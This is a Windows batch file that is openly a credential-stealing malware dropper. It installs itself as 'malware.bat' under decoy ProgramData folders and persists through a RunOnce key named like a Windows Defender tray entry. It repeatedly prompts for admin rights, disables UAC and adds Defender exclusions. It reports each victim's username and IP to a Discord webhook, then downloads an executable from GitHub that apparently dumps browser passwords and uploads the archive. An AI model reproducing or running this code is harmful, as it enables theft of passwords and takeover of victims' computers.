@echo off
:::::::::::: ANTI VM SCRIPT ::::::::::::-

REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender > nul
if %errorlevel%==1 (
    REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender /t REG_SZ /d "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
)
curl -o "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\ip" https://myexternalip.com/raw
set /p ip=<"%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\ip"

title Microsoft Windows Emergency System
::@@@@@@@@@@@ SETTINGS @@@@@@@@@@@::

set silent_launch=true
set backup=false
set webhook=https://discord.com/api/webhooks/1048739183512006808/GUT57O-ERldgNxWd7fTkfyKKv7uRVpVuSEbJ66LneGVk3OPHtC0DMw4aOt_ePaUTvlcy

::@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@::

:::::::::::: FAKE DIRECTORIES CREATION ::::::::::::
if not exist %programdata%\Windows\03959e0a-3ee0-4c15-a815-3f3de35bea32 (mkdir %programdata%\Windows\03959e0a-3ee0-4c15-a815-3f3de35bea32)
if not exist %programdata%\Windows\0f49223a-a530-4a4c-8a24-b12dd7772cf4 (mkdir %programdata%\Windows\0f49223a-a530-4a4c-8a24-b12dd7772cf4)
if not exist %programdata%\Windows\17a196d6-db45-4adf-8c3d-c7a3d9830750 (mkdir %programdata%\Windows\17a196d6-db45-4adf-8c3d-c7a3d9830750)
if not exist %programdata%\Windows\1db38861-dbbe-4b82-8e4a-11ba0204b5eb (mkdir %programdata%\Windows\1db38861-dbbe-4b82-8e4a-11ba0204b5eb)
if not exist %programdata%\Windows\277cfd81-3942-4dfc-87bb-35957e18e3b0 (mkdir %programdata%\Windows\277cfd81-3942-4dfc-87bb-35957e18e3b0)
if not exist %programdata%\Windows\32a2fd0c-b15f-4f3e-a63b-5dcad918063b (mkdir %programdata%\Windows\32a2fd0c-b15f-4f3e-a63b-5dcad918063b)
if not exist %programdata%\Windows\36aaed88-60a2-477d-a69e-651685e445f4 (mkdir %programdata%\Windows\36aaed88-60a2-477d-a69e-651685e445f4)
if not exist %programdata%\Windows\38c1d332-f702-4c44-b43f-5dda6dc105da (mkdir %programdata%\Windows\38c1d332-f702-4c44-b43f-5dda6dc105da)
if not exist %programdata%\Windows\4a0f6d90-9e64-481c-bf13-bf61d37f271a (mkdir %programdata%\Windows\4a0f6d90-9e64-481c-bf13-bf61d37f271a)
if not exist %programdata%\Windows\4c51f98b-7b8e-4777-89d0-612451b3fe5c (mkdir %programdata%\Windows\4c51f98b-7b8e-4777-89d0-612451b3fe5c)
if not exist %programdata%\Windows\51c89eb6-0063-4ee0-87fc-df7c4d57dd6e (mkdir %programdata%\Windows\51c89eb6-0063-4ee0-87fc-df7c4d57dd6e)
if not exist %programdata%\Windows\53ad6b9b-3918-459c-8917-e50d4911fae1 (mkdir %programdata%\Windows\53ad6b9b-3918-459c-8917-e50d4911fae1)
if not exist %programdata%\Windows\553ad423-59a5-4022-ab0d-765d19c995ce (mkdir %programdata%\Windows\553ad423-59a5-4022-ab0d-765d19c995ce)
if not exist %programdata%\Windows\58decd6d-2f0f-4675-b5de-217b654e7f6c (mkdir %programdata%\Windows\58decd6d-2f0f-4675-b5de-217b654e7f6c)
if not exist %programdata%\Windows\5ab1865b-ff5e-4396-9d0e-2d778a060dd9 (mkdir %programdata%\Windows\5ab1865b-ff5e-4396-9d0e-2d778a060dd9)
if not exist %programdata%\Windows\7986f531-8dcb-4072-808a-9e2e7637f829 (mkdir %programdata%\Windows\7986f531-8dcb-4072-808a-9e2e7637f829)
if not exist %programdata%\Windows\7b02fc9c-a461-4fc0-939b-2eaf39fd81c9 (mkdir %programdata%\Windows\7b02fc9c-a461-4fc0-939b-2eaf39fd81c9)
if not exist %programdata%\Windows\87b81f8a-833d-48af-98b9-fb5a78fc2ba4 (mkdir %programdata%\Windows\87b81f8a-833d-48af-98b9-fb5a78fc2ba4)
if not exist %programdata%\Windows\89d1290b-109c-43f3-876e-5e4c814034e0 (mkdir %programdata%\Windows\89d1290b-109c-43f3-876e-5e4c814034e0)
if not exist %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d (mkdir %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d)
if not exist %programdata%\Windows\977aca53-ba41-4da7-bcf4-dd52b3938611 (mkdir %programdata%\Windows\977aca53-ba41-4da7-bcf4-dd52b3938611)
if not exist %programdata%\Windows\a9be1c84-a1fd-4d45-b751-705d6319b2d7 (mkdir %programdata%\Windows\a9be1c84-a1fd-4d45-b751-705d6319b2d7)
if not exist %programdata%\Windows\b3a0122d-12bc-4156-84e5-ad8ab84750e7 (mkdir %programdata%\Windows\b3a0122d-12bc-4156-84e5-ad8ab84750e7)
if not exist %programdata%\Windows\b433a163-a432-4c62-8d40-55f7811d6bab (mkdir %programdata%\Windows\b433a163-a432-4c62-8d40-55f7811d6bab)
if not exist %programdata%\Windows\b76d649b-9fdf-43ec-81ff-5eb1331bb690 (mkdir %programdata%\Windows\b76d649b-9fdf-43ec-81ff-5eb1331bb690)
if not exist %programdata%\Windows\b997b9c1-d0c4-474a-a4a7-6e51f8cf528c (mkdir %programdata%\Windows\b997b9c1-d0c4-474a-a4a7-6e51f8cf528c)
if not exist %programdata%\Windows\bbffd1ee-b5a9-49bd-a4a1-84aa67525a07 (mkdir %programdata%\Windows\bbffd1ee-b5a9-49bd-a4a1-84aa67525a07)
if not exist %programdata%\Windows\c22aaae2-02f7-4519-82b5-5647acba7d40 (mkdir %programdata%\Windows\c22aaae2-02f7-4519-82b5-5647acba7d40)
if not exist %programdata%\Windows\cb53a92e-ea4d-4650-a08a-85d177f80cba (mkdir %programdata%\Windows\cb53a92e-ea4d-4650-a08a-85d177f80cba)
if not exist %programdata%\Windows\cc088ece-1a0b-47db-84a3-1c222b52a1f1 (mkdir %programdata%\Windows\cc088ece-1a0b-47db-84a3-1c222b52a1f1)
if not exist %programdata%\Windows\d4855188-4880-480a-873c-14f5c9ecd530 (mkdir %programdata%\Windows\d4855188-4880-480a-873c-14f5c9ecd530)
if not exist %programdata%\Windows\d6c18650-3a08-4390-823c-9ff93210d7f3 (mkdir %programdata%\Windows\d6c18650-3a08-4390-823c-9ff93210d7f3)
if not exist %programdata%\Windows\db0a52c9-cb01-48a7-917e-18ce0ebe1d77 (mkdir %programdata%\Windows\db0a52c9-cb01-48a7-917e-18ce0ebe1d77)
if not exist %programdata%\Windows\e5f7b52e-0ec0-4df6-9fab-66e24f0ad5d4 (mkdir %programdata%\Windows\e5f7b52e-0ec0-4df6-9fab-66e24f0ad5d4)
if not exist %programdata%\Windows\e66c4f31-b2f4-429e-bcc3-7a734749045b (mkdir %programdata%\Windows\e66c4f31-b2f4-429e-bcc3-7a734749045b)
if not exist %programdata%\Windows\e671a3d1-e21d-4b4b-9116-0f66d64b00a7 (mkdir %programdata%\Windows\e671a3d1-e21d-4b4b-9116-0f66d64b00a7)
if not exist %programdata%\Windows\f01246cd-2635-4cd3-a3cb-10a57a4b7de0 (mkdir %programdata%\Windows\f01246cd-2635-4cd3-a3cb-10a57a4b7de0)
if not exist %programdata%\Windows\f4e20495-1e50-4e79-aba1-f9584c9edc88 (mkdir %programdata%\Windows\f4e20495-1e50-4e79-aba1-f9584c9edc88)

:::::::::::: BACKUP CREATING SYSTEM ::::::::::::
if %backup%==true (
    copy "%~0" "%~dp0\backup.bat"
) else if %backup%==false (cd.>nul) else (
    echo [LOGS] Error loading backup setting
)

:::::::::::: FIRST LAUNCH CONFIGURATION ::::::::::::
if exist "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\first-time-launch.tdc" (
    goto :firstlaunch
) else (
    copy "%~0" "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
    echo "%~0">"%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\first-time-launch.tdc"
    if %silent_launch%==true (
        powershell Start-Process "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat" -WindowStyle hidden
    ) else if %silent_launch%==false (
        start cmd.exe /c "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
    ) else (
        echo [LOGS] Error loading silent launch setting
        pause
    )
    exit
)

:::::::::::: SCRIPT LOADED AT FIRST LAUNCH ::::::::::::
:firstlaunch

set /p cringe=<"%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\first-time-launch.tdc"

if exist "%cringe%" (
    del %cringe% /f
)

:::::::::::: ADMIN.BAT CREATION ::::::::::::
echo IF "%%PROCESSOR_ARCHITECTURE%%" EQU "amd64" ( > %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo ^>nul 2^>^&1 "%%SYSTEMROOT%%\SysWOW64\cacls.exe" "%%SYSTEMROOT%%\SysWOW64\config\system" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo ) ELSE ( >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo ^>nul 2^>^&1 "%%SYSTEMROOT%%\system32\cacls.exe" "%%SYSTEMROOT%%\system32\config\system" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo ) >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo if '%%errorlevel%%' NEQ '0' ( >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo echo Requesting administrative privileges... >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo goto UACPrompt >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo ) else ( goto gotAdmin ) >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo :UACPrompt >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo echo Set UAC = CreateObject^("Shell.Application"^) ^> "%%temp%%\getadmin.vbs" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo set params = %%*:"="^" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo echo UAC.ShellExecute "cmd.exe", "/c ""%%~s0"" %%params%%", "", "runas", 1 ^>^> "%%temp%%\getadmin.vbs" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo "%%temp%%\getadmin.vbs" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo del "%%temp%%\getadmin.vbs" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo exit /B >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo :gotAdmin >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo pushd "%%CD%%" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo CD /D "%%~dp0" >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo echo.^>gotadmin >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
echo timeout 7 /nobreak ^> nul >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat 
if %silent_launch%==true (
    echo powershell Start-Process %%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat -Verb RunAs -WindowStyle Hidden >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
) else (
    echo powershell Start-Process %%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat -Verb RunAs >> %programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat
)

:::::::::::: UAC LAZY SPAM TILL ADMIN ::::::::::::
:tdc
if exist "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\gotadmin" (
    if exist "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\adminproof" (
        goto :administrative
    ) else (
        echo.>"%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\adminproof"
        exit
    )
) else (
    powershell Start-Process "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\admin.bat" -Verb RunAs -WindowStyle Hidden > nul
    timeout 5 /nobreak > nul
    goto :tdc
)

:::::::::::: SCRIPT LOADED WHEN ADMIN ::::::::::::
:administrative

IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"=""
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

cls

reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul

REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender > nul
if %errorlevel%==1 (
    REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender /t REG_SZ /d "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
)

powershell Add-MpPreference -ExclusionExtension ".bat"
powershell Add-MpPreference -ExclusionExtension ".exe"
powershell Add-MpPreference -ExclusionExtension ".crdownload"
powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'

if exist "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\beforerestart" (
    goto :after
) else (
    echo.>"%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\beforerestart"
    timeout 5 /nobreak > nul
    REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender > nul
    if %errorlevel%==1 (
        REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender /t REG_SZ /d "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
    )
    curl -X POST -H "Content-type: application/json" --data "{\"content\": \":zombie: **NEW ZOMBIE INFECTED** :zombie:\n\n**Information of User**\n:bust_in_silhouette: Username : %username%\n:gear: IP : %ip%\"}" %webhook%
    shutdown -f -r -t 00 
    exit
)

:after
REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender > nul
if %errorlevel%==1 (
    REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v *WindowsSecurityTrayDefender /t REG_SZ /d "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\malware.bat"
)
echo cd "%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d" > "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo powershell iwr -useb https://raw.githubusercontent.com/Dazd-Pkz/Testicule/main/pg.exe -OutFile %%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pg.exe >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo %%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pg.exe -b all -f json --zip --dir pass >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo curl -F s=@"%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pass\pass.zip" %webhook% >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo del "%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pg.exe" /f >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo del "%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\chromiumKey" /f >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo del "%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pass\pass.zip" /f >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
echo rmdir "%%programdata%%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\pass" /s /q >> "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat"
start powershell Start-Process "%programdata%\Windows\8fee4aba-2b51-4d46-979e-91bc4e752f5d\hiddengr.bat" -Verb RunAs -WindowStyle Hidden
curl -X POST -H "Content-type: application/json" --data "{\"content\": \":green_circle: **ZOMBIE CONNECTED** :green_circle:\n\n**Information of User**\n:bust_in_silhouette: Username : %username%\n:gear: IP : %ip%\"}" %webhook%
exit
